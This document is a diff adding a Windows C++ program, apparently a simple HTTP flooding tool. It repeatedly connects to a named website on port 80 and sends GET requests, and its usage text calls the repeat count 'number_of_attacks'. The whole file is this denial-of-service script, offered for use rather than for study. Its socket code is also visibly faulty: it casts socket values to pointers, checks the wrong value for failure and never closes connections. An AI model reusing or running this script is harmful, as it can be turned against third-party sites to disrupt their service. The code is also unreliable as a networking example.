@@ -1,0 +1,108 @@
+#include <windows.h>
+#include <winsock2.h>
+#include <iostream>
+
+BOOL InitConnection(SOCKET *wSock, char *SERV);
+BOOL InitWSA();
+BOOL InitSocket(SOCKET *wSock);
+DWORD WINAPI RecvData(LPVOID* wSock);
+
+int main(int argc, char** argv)
+{
+    if(argc != 3)
+    {
+        std::cout << "Usage: www.site.com [number_of_attacks]\n";
+        std::cout << "Example: main.exe www.cowgirls.com 100\n";
+        exit(1);
+    }
+   
+    SOCKET tehRock;
+    int number = atoi(argv[2]);
+    char *site = argv[1];
+    char buffert[65000];
+   
+    //CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(RecvData), (LPVOID)tehRock, 0, NULL);
+   
+    for(int i = 0; i < number; i++)
+    {
+        if(InitWSA() == true)
+        std::cout << "WS2_32.DLL loaded\n";
+        Sleep(20);
+        if(InitSocket(&tehRock) == true)
+        std::cout << "Socket created.\n";
+        Sleep(20);
+        if(InitConnection((SOCKET*)tehRock, site) == true)
+        std::cout << "Connected.\n";
+        Sleep(20);
+        send(tehRock, "GET / HTTP/1.0\r\n\r\n", 19, 0);
+        std::cout << "Sending HTTP GET REQUEST\n";
+        while(recv(tehRock, buffert, sizeof(buffert), 0) > 0)
+        std::cout << buffert;
+    }
+}
+   
+DWORD WINAPI RecvData(LPVOID* wSock)
+{
+    SOCKET socket = (SOCKET)wSock;
+    char data[65356];
+    ZeroMemory(&data, sizeof(data));
+    std::cout << "Thread successfully created.\n";
+    while(1)
+    {
+        if(recv(socket, data, sizeof(data), 0) > 0)
+        std::cout << data;
+        Sleep(1);
+    }
+}
+
+BOOL InitConnection(SOCKET *wSock, char *SERV)
+{
+    int port = 80;
+    struct hostent *host;
+    struct sockaddr_in sin;
+    int error;
+   
+    host = gethostbyname(SERV);
+    memset( &sin, 0, sizeof sin );
+    sin.sin_family = AF_INET;
+    sin.sin_addr = *((in_addr *)host->h_addr);
+    sin.sin_port = htons(port);
+    error = connect((SOCKET)wSock, (sockaddr*)&sin, sizeof sin);
+   
+    if(error != 0)
+    return false;
+   
+    return true;
+}
+   
+   
+BOOL InitSocket(SOCKET *wSock)
+{
+    *wSock = socket(AF_INET, SOCK_STREAM, 0);
+   
+    if((SOCKET)wSock == INVALID_SOCKET)
+    return false;
+   
+    return true;
+}
+
+BOOL InitWSA()
+{
+    WSADATA wsaData;
+    WORD version;
+    version = MAKEWORD(2, 2);
+   
+    int error;
+    error = WSAStartup(version, &wsaData);
+   
+    if(error != 0)
+    return false;
+   
+    if(LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)
+    {
+        WSACleanup();
+        return false;
+    }
+   
+    return true;
+} 
